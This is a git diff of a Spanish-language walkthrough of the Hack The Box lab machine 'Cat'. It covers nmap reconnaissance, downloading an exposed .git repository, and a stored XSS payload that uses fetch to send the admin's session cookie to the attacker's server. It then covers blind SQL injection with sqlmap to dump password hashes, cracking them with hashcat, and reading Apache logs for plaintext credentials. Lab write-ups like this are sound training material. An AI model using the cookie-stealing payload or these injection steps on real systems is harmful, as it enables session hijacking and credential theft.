@@ -23,7 +23,7 @@ layout:
 
 ## Reconnaissance
 
-
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **`Cat`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.11.53 -oG allPorts
@@ -38,9 +38,7 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
 ```
 
-
-
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -53,9 +51,7 @@ Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
 [*] Ports copied to clipboard
 ```
 
-
-
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Apache` y el servicio de `SSH`.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.53 -A -oN targeted -oX targetedXML
@@ -98,9 +94,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 12.18 seconds
 ```
 
-
-
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -109,70 +103,66 @@ Nmap done: 1 IP address (1 host up) scanned in 12.18 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ cat /etc/hosts | grep 10.10.11.53
 10.10.11.53 cat.htb
 ```
 
-
-
 ## Web Enumeration
 
-
+Accederemos a [http://cat.htb](http://cat.htb) y verificaremos el contenido del sitio web. Entre la información que podemos recopilar comprobamos diferentes páginas dentro del menú principal del sitio web.
 
 <figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Al acceder a la sección de `vote.php` verificamos que se trata de una página web en `PHP` de un concurso de gatos, en el cual nos permitían votar. En este caso, se nos indica que el proceso de votación se encuentra actualmente cerrado, por lo cual no podríamos interactuar con estas opciones.
 
 <figure><img src="../../.gitbook/assets/imagen (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Al acceder a la página de `winners.php`, verificamos una página web en donde muestran quién ha sido el ganador del concurso. No logramos obtener más información en esta sección.
 
 <figure><img src="../../.gitbook/assets/imagen (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
+Verificamos también una página de `join.php` en la cual nos permite registrarnos como usuarios.
 
 <figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
+Trataremos de registrarnos con un usuario de prueba para verificar si al acceder, nos proporcionan más acceso a otras secciones o si podemos realizar alguna acción con este usuario.
+
+<figure><img src="../../.gitbook/assets/imagen (6) (1) (1) (1) (1).png" alt="" width="476"><figcaption></figcaption></figure>
+
+Verificamos que nos aparece que el registro se ha realizado correctamente. El siguiente paso será iniciar sesión con el usuario recién creado para verificar si tenemos acceso.
+
+<figure><img src="../../.gitbook/assets/imagen (7) (1) (1) (1) (1).png" alt="" width="473"><figcaption></figcaption></figure>
 
 
-<figure><img src="../../.gitbook/assets/imagen (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
-<figure><img src="../../.gitbook/assets/imagen (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
+Comprobamos que disponemos de acceso a una página llamada `contest.php` en la cual podemos enviar un formulario con datos para el concurso. Interceptaremos esta solicitud con datos aleatorios y una imagen válida para verificar cómo se envía la solicitud.
 
 <figure><img src="../../.gitbook/assets/imagen (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ### Attempting to upload a malicious PHP file
 
-
+Al enviar la solicitud anterior a través de `BurpSuite`, verificamos que se envía correctamente el formulario. En la respuesta por parte del servidor, nos muestra un mensaje indicando `Cat has ben successfully sent for inspection`. Lo cual nos sugiere que alguien por detrás quizás esté inspeccionando estos datos.
 
 <figure><img src="../../.gitbook/assets/imagen (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Probaremos de modificar la extensión del archivo que enviamos a `PHP` que es el lenguaje que utiliza la página web, al enviar el formulario, se nos indica que solamente está permitido archivos con extensión `JPG`, `JPEG` y `PNG`.
 
 <figure><img src="../../.gitbook/assets/imagen (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
+También probamos de inyectar código `JavaScript`, en este caso, la aplicación por detrás, sanitiza y bloquea estos caracteres y nos muestra en la respuesta por parte del servidor de que los caracteres introducidos son inválidos.
 
+<figure><img src="../../.gitbook/assets/imagen (335).png" alt=""><figcaption></figcaption></figure>
 
 ### Downloading Git Folder disclosure (GitHack)
 
-
+Realizaremos una enumeración de directorios y páginas web a través de `dirsearch`. En el resultado obtenido, verificamos la existencia de un directorio `/.git/`.
 
 ```bash
 ❯ dirsearch -u 'http://cat.htb' -i 200 -t 50 2>/dev/null
@@ -198,13 +188,13 @@ Target: http://cat.htb/
 [23:55:20] 200 -   41B  - /.git/refs/heads/master
 ```
 
-
+A través de la herramienta de `GitHack`, nos descargaremos el repositorio de `Git` en nuestro equipo.
 
 ```bash
 ❯ python3 /opt/GitHack/GitHack.py http://cat.htb/.git/ 2>/dev/null 
 ```
 
-
+Verificaremos la estructura de la carpeta que se nos ha descargado. Comprobamos la existencia de diversos archivos PHP que parecen ser relacionados con las páginas existentes en la página web.
 
 ```bash
 ❯ tree
@@ -236,9 +226,9 @@ Target: http://cat.htb/
 5 directories, 19 files
 ```
 
+Encontramos el archivo `contest.php`, encargado de procesar las inscripciones al concurso de gatos. Permite a usuarios autenticados enviar nombre, edad, fecha de nacimiento, peso y una imagen, almacenando los datos en la base de datos y guardando la imagen en `uploads/`.
 
-
-
+Intentamos bypassear la restricción de subida de archivos, logrando finalmente subir un archivo PHP malicioso. Sin embargo, no pudimos ejecutar el código porque el archivo se renombraba con `uniqid()`, lo que impedía determinar su ruta exacta dentro de `uploads/`.
 
 {% code title="contest.php" %}
 ```php
@@ -344,9 +334,19 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 ```
 {% endcode %}
 
+Encontramos el archivo `admin.php`, el cual parece ser un panel de administración para gestionar las inscripciones de gatos. Solo permite el acceso al usuario `axel`, redirigiendo a `join.php` si no se cumple esta condición.
 
+Este script recupera todos los registros de la tabla `cats` y los almacena en la variable `$cats` para su posterior visualización.
 
+#### **Posibles vulnerabilidades**
 
+1. **Falta de roles o privilegios adecuados**
+   * Restringe el acceso solo por el nombre de usuario, sin comprobar permisos reales.
+   * Si logramos secuestrar la sesión (`session hijacking`), podríamos acceder sin necesidad de credenciales válidas.
+2. **Exposición de datos**
+   * Si este archivo no tiene controles adicionales en su frontend, podría filtrar información sensible sobre los gatos registrados y sus dueños.
+
+En este caso, sería interesante revisar si podemos secuestrar la sesión de `axel` o encontrar otro punto de entrada para acceder al contenido de `admin.php`.
 
 {% code title="admin.php" %}
 ```php
@@ -369,7 +369,7 @@ $cats = $stmt->fetchAll(PDO::FETCH_ASSOC);
 ```
 {% endcode %}
 
-
+Encontramos el archivo `config.php`, que maneja la conexión a la base de datos SQLite usando el archivo `/databases/cat.db`. Este script utiliza `PDO` para gestionar la conexión y está configurado para lanzar excepciones en caso de error. Es incluido en otros archivos para permitir el acceso a la base de datos.
 
 {% code title="config.php" %}
 ```php
@@ -388,9 +388,23 @@ try {
 ```
 {% endcode %}
 
+En nuestra revisión del sistema, encontramos el archivo `join.php`, que gestiona el proceso de registro e inicio de sesión de los usuarios. Al analizarlo, identificamos varias vulnerabilidades críticas que podrían comprometer la seguridad de la aplicación.
 
+#### **Vulnerabilidades encontradas:**
 
-{% code title="" %}
+1. **Falta de validación de entradas (XSS)**
+
+* En este archivo, las entradas de usuario como `username`, `email`, y `password` no son validadas ni saneadas adecuadamente. Esto permite que un atacante inyecte scripts maliciosos en estos campos, lo que podría dar lugar a un **ataque XSS** (Cross-Site Scripting). Si un atacante puede manipular los valores de estos campos, podría robar información sensible de otros usuarios o ejecutar código malicioso en su navegador.
+
+2. **Exposición de credenciales a través de URL (GET)**
+
+* Los datos sensibles como username, email, y password se envían a través de la URL usando el método GET. Esto es muy riesgoso, ya que los parámetros enviados por GET quedan registrados en los logs del servidor, en el historial del navegador y en la caché. Un atacante podría acceder a estos datos si tienen acceso a alguno de estos registros, exponiendo las credenciales de los usuarios.
+
+3. **Cifrado débil de contraseñas (`md5`)**
+
+* El archivo utiliza `md5()` para cifrar las contraseñas antes de almacenarlas. Este algoritmo es obsoleto y vulnerable a ataques de colisión y de fuerza bruta. Un atacante podría descifrar fácilmente las contraseñas almacenadas en la base de datos.
+
+{% code title="join.php" %}
 ```php
 <?php
 session_start();
@@ -445,48 +459,52 @@ if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['loginForm'])) {
 ```
 {% endcode %}
 
-
-
 ## Initial Foothold
 
+Hasta ahora, hemos recopilado información clave sobre el sistema. Hemos observado que al registrarse, no se realiza una correcta sanitización de los datos de entrada, lo que podría derivar en ataques de **XSS** (Cross-Site Scripting). Esto abre la puerta a posibles ataques como el **robo de cookies** o la ejecución de código malicioso en el navegador de otro usuario.
 
+Además, al enviar el formulario, se presenta un mensaje que nos hace sospechar que alguien podría estar revisando las entradas del formulario. Esto, sumado a la información obtenida de los archivos de configuración, revela que existe una sección accesible únicamente para el usuario **axel**. Esto nos da una pista valiosa sobre el flujo de la aplicación y el manejo de usuarios.
+
+Con esta información en mente, el siguiente paso será intentar determinar si la opción **HttpOnly** está configurada como `false` en las cookies. Si este es el caso, podríamos intentar realizar un **cookie hijacking** de la cookie del usuario **axel**, ya que parece ser la persona que revisa el formulario. De ser así, podríamos capturar su sesión y obtener acceso a su cuenta.
+
+Nuestro objetivo será inyectar código JavaScript malicioso en el campo `username` del formulario. De este modo, cuando un usuario, posiblemente **axel**, vea nuestro formulario, el código inyectado se ejecutará en su navegador. Si la cookie no está marcada como **HttpOnly**, podremos interceptarla y enviarla a un servidor externo, permitiéndonos robar la sesión del usuario.
+
+Este sería el siguiente paso en nuestra explotación del sistema.
 
 ### Performing Cookie Hijacking
 
-
+Verificaremos si el atributo de `HttpOnly` se encuentra en `False`. Comprobamos que el sitio web dispone de esta mala configuración, lo cual la hace susceptible al `Cookie Hijacking` (robo de cookies de sesión).
 
 <figure><img src="../../.gitbook/assets/imagen (285).png" alt=""><figcaption></figcaption></figure>
 
-
+El siguiente objetivo será inyectar un payload malicioso en `JavaScript`para robar la cookie de sesión del usuario. Nos registraremos con el siguiente script que enviará la cookie a nuestro servidor web de atacante que abriremos más adelante.
 
 ```javascript
 <script>fetch("http://10.10.16.5/?value=" + document.cookie);</script> 
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (286).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (286).png" alt="" width="423"><figcaption></figcaption></figure>
 
+Comprobamos que se ha registrado correctamente el usuario, no hemos tenido problemas debido a la configuración de la página web que no sanitizaba correctamente estos campos, accederemos con el usuario recién creado.
 
+<figure><img src="../../.gitbook/assets/imagen (288).png" alt="" width="423"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (288).png" alt=""><figcaption></figcaption></figure>
-
-
+Por un lado, no levantaremos un servidor web en nuestro equipo por el puerto 80.
 
 ```bash
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
+Enviaremos nuevamente un formulario con datos aleatorios.
 
+<figure><img src="../../.gitbook/assets/imagen (289).png" alt="" width="422"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (289).png" alt=""><figcaption></figcaption></figure>
+Se enviará correctamente el formulario, el siguiente paso será verificar en nuestro servidor web si logramos obtener la cookie de sesión del usuario que esté revisando nuestro formulario (en caso de que lo hubiera).
 
+<figure><img src="../../.gitbook/assets/imagen (290).png" alt="" width="419"><figcaption></figcaption></figure>
 
-
-<figure><img src="../../.gitbook/assets/imagen (290).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
+Al esperar un tiempo, verificamos que al parecer sí había un usuario revisando nuestro formulario. Esto fue posible debido que en el `username` inyectamos el payload **XSS** para el `Cookie Hijacking` porque no estaba sanitizando correctamente y el sitio web tenia el `HttpOnly` en `False`.
 
 ```bash
 ❯ python3 -m http.server 80
@@ -494,19 +512,21 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.53 - - [05/Feb/2025 01:31:56] "GET /?value=PHPSESSID=ojvduvoofuju8avf7cijqorq6g HTTP/1.1" 200 -
 ```
 
-
+Modificamos nuestra cookie de sesión actual y la cambiaremos por la recién robada.
 
 <figure><img src="../../.gitbook/assets/imagen (291).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ### Executing SQL Injection Blind
 
+Obtenemos una nueva pestaña `admin.php` en la cual nos aparecen los formularios que han sido enviados. Nos ofrecen 3 opciones, visualizar el formulario, aceptarlo y rechazarlo.
 
+Si bien recordamos, esta página de `admin.php` la habíamos enumerado anteriormente en el `/.git/`que encontramos. Esta página solamente tenía acceso el usuario `axel`, lo cual nos confirma que dado que disponemos del acceso a esta página, la cookie de sesión pertenece a dicho usuario.
 
 <figure><img src="../../.gitbook/assets/imagen (292).png" alt=""><figcaption></figcaption></figure>
 
+En los archivos que encontramos dentro de `/.git/`, nos encontramos con el archivo **"view\_cat.php"**, que parece ser la opción para visualizar un formulario con la información de un gato registrado.
 
+Este archivo está configurado de tal manera que solo el usuario **axel** puede acceder a él. Una vez autenticado, el script obtiene el parámetro `cat_id` desde la URL y lo usa en una consulta SQL para recuperar los datos del gato y su dueño desde la base de datos.
 
 {% code title="view_cat.php" %}
 ```php
@@ -545,7 +565,14 @@ if ($cat_id) {
 ```
 {% endcode %}
 
+En los archivos que encontramos dentro de `/.git/`, hallamos el archivo **"accept\_cat.php"**, que parece ser el encargado de aceptar gatos en el sistema.
 
+Este archivo está configurado de tal manera que solo el usuario **axel** puede acceder a él. Si se envía una solicitud **POST** con un `catId` y un `catName`, el script inserta el nombre del gato en la tabla `accepted_cats` y luego elimina el registro correspondiente de la tabla `cats`.
+
+#### **Posibles vulnerabilidades encontradas**
+
+* **Inyección SQL (SQLi):** La consulta `INSERT INTO accepted_cats (name) VALUES ('$cat_name')` no usa sentencias preparadas, lo que permite inyectar SQL a través del `catName`. Esto podría llevar a la ejecución de comandos arbitrarios en la base de datos.
+* **Falta de validación y sanitización:** No hay ningún control sobre los valores recibidos en `catId` y `catName`, lo que podría permitir **XSS almacenado** si los datos son reflejados en otra parte del sistema.
 
 {% code title="accept_cat.php" %}
 ```php
@@ -580,9 +607,19 @@ if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
 ```
 {% endcode %}
 
+En los archivos que recuperamos de `/.git/`, encontramos **"delete\_cat.php"**, un script encargado de eliminar registros de gatos del sistema.
 
+#### **Funcionamiento del archivo**
 
+* Solo el usuario **axel** puede acceder a esta funcionalidad.
+* Si se recibe una solicitud **POST** con un `catId`, se busca la foto asociada en la base de datos.
+* Si el registro existe, se elimina tanto de la base de datos como del sistema de archivos mediante `unlink()`.
 
+#### **Posibles vulnerabilidades**
+
+* **Falta de validación en `catId`:** Aunque el parámetro es tratado como un número entero (`PDO::PARAM_INT`), no hay validaciones adicionales para evitar el envío de datos manipulados.
+* **Posible Insecure Direct Object References (IDOR):** Si conseguimos acceso a una cuenta con permisos suficientes, podríamos eliminar gatos sin restricciones.
+* **Falta de control en `unlink()`:** Si `photo_path` contiene una ruta manipulada, podría eliminar archivos fuera del directorio esperado (Path Traversal).
 
 {% code title="delete_cat.php" %}
 ```php
@@ -629,13 +666,15 @@ if (isset($_SESSION['username']) && $_SESSION['username'] == 'axel'){
 ```
 {% endcode %}
 
+Por lo tanto, teniendo en cuenta la configuración de las opciones de la página web, el siguiente objetivo será intentar realizar inyecciones SQLi para obtener los datos de la BBDD.
 
+Para ello, intereceptaremos con `BurpSuite` la solicitud al darle a la opción de `Accept` que en un principio según revisamos en el código parecía vulnerable a inyecciones SQL.
 
-
+Haremos click derecho y nos copiaremos la solicitud en un archivo.
 
 <figure><img src="../../.gitbook/assets/imagen (293).png" alt=""><figcaption></figcaption></figure>
 
-
+Verificaremos que disponemos de un archivo llamado `request` el cual contiene la petición interceptada con `BurpSuite`.
 
 ```bash
 ❯ cat request
@@ -657,11 +696,9 @@ Priority: u=0
 catName=GzzcooCat&catId=1
 ```
 
+Después de un breve tiempo, hicimos diversas pruebas de inyecciones SQL con `SQLMap`. Finalmente el último comando utilizado fue el siguinte. Utilizamos esta herramienta dado que las inyecciones eran `SQLI Blind` y deberíamos hacer fuerza bruta carácter por carácter para averiguar los resultados de la base de datos.
 
-
-
-
-
+En este caso, la herramienta lo realiza por nosotros, en el resultado obtenido, comprobamos diversos nombres de tablas de la base de datos.
 
 ```bash
 ❯ sqlmap -r request -p catName --dbms sqlite --level 5 --risk 3 --technique=BEST --tables
@@ -729,7 +766,7 @@ back-end DBMS: SQLite
 [*] ending @ 02:33:44 /2025-02-05/
 ```
 
-
+En la siguiente consulta, enumeraremos las columnas presentes de la tabla `users` que parece ser la que nos podría dar más información sobre usuarios, credenciales etc. Con el resultado obtenido, verificamos la existencia de las columnas `username` y `password`.
 
 ```bash
 ❯ sqlmap -r request -p catName --dbms sqlite --level 5 --risk 3 --technique=BEST -T users --columns
@@ -786,7 +823,7 @@ Table: users
 
 ```
 
-
+El siguiente paso, será obtener los datos de las columnas mencionadas, para ello haremos uso de la siguiente consulta con `SQLMap`. En el resultado obtenido, comprobamos que logramos obtener diversos hashes de diferentes usuarios.
 
 ```bash
 ❯ sqlmap -r request -p catName --dbms sqlite --level 5 --risk 3 --technique=BEST -T users -C username,password --dump
@@ -873,11 +910,9 @@ Table: users
 [02:59:56] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/cat.htb'
 ```
 
-
-
 ### Cracking hashes
 
-
+Después de un tiempo intentando crackear estos hashes obtenidos, verificamos que logramos obtener la contraseña en texto plano del hash del usuario `rosa`.
 
 ```bash
 ❯ hashcat -a 0 -m 0 hashes /usr/share/wordlists/rockyou.txt
@@ -891,9 +926,9 @@ OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8,
 ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa
 ```
 
+### Access via SSH with newly cracked password
 
-
-### Access via SSH with newly cracked password&#x20;
+Trataremos de acceder al `SSH`con este usuario para verificar si podemos acceder al equipo. Comprobamos que  hemos podido acceder al equipo sin problemas.
 
 ```bash
 ❯ ssh rosa@cat.htb
@@ -911,30 +946,26 @@ Last login: Sat Sep 28 15:44:52 2024 from 192.168.1.64
 rosa@cat:~$
 ```
 
-
-
 ## Initial Access
-
-
-
-
 
 ### Abusing adm group to see disclosure of sensitive data in logs
 
-
+Verificando los grupos a los que forma parte la usuaria `rosa`, verificamos que forma parte del grupo `adm`.&#x20;
 
 ```bash
 rosa@cat:~$ id
 uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm)
 ```
 
-
-
 {% embed url="https://wiki.debian.org/SystemGroups" %}
+
+{% hint style="info" %}
+El grupo **adm** se utiliza para tareas de monitoreo del sistema. Los miembros de este grupo pueden leer muchos archivos de registro en **/var/log** y pueden usar **xconsole**. Históricamente, **/var/log** solía ser **/usr/adm** (y más tarde **/var/adm**), de ahí el nombre del grupo.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (294).png" alt=""><figcaption></figcaption></figure>
 
-
+Ingresaremos al directorio `/var/log` y buscaremos aquellos directorios y archivos los cuales formando parte del grupo `adm` dispongamos acceso para leer los logs.
 
 ```bash
 rosa@cat:/var/log$ ls -l | grep adm
@@ -955,9 +986,7 @@ drwxr-x---  3 root      adm                4096 Jun  3  2024 installer
 -rw-r-----  1 syslog    adm              131116 Jan 31 11:17 syslog.2.gz
 ```
 
-
-
-
+Accederemos al primer directorio, `/var/log/apache2` y comprobaremos que dispone de diversos de acceso y errores.
 
 ```bash
 rosa@cat:/var/log/apache2$ ls -l
@@ -971,7 +1000,7 @@ total 2472
 -rw-r----- 1 root adm       0 Jan 21 12:34 other_vhosts_access.log
 ```
 
-
+Al revisar el contenido del archivo `access.log` filtrando a través de `regex`(expresiones regulares) por palabras clave como `username,password`, etc. Verificamos que aparece lo que parece ser las credenciales en texto plano del usuario `axel`.
 
 ```bash
 rosa@cat:/var/log/apache2$ cat access.log | grep -iE "login|password|pass|username|user" | head -n 10
@@ -982,7 +1011,7 @@ rosa@cat:/var/log/apache2$ cat access.log | grep -iE "login|password|pass|userna
 127.0.0.1 - - [05/Feb/2025:01:28:01 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
 ```
 
-
+Intentaremos pivotar al usuario `axel`, comprobamos que las credenciales son válidas y hemos obtenido acceso con ese usuario y logramos visualizar la flag de **user.txt**.
 
 ```bash
 rosa@cat:/var/log/apache2$ su axel
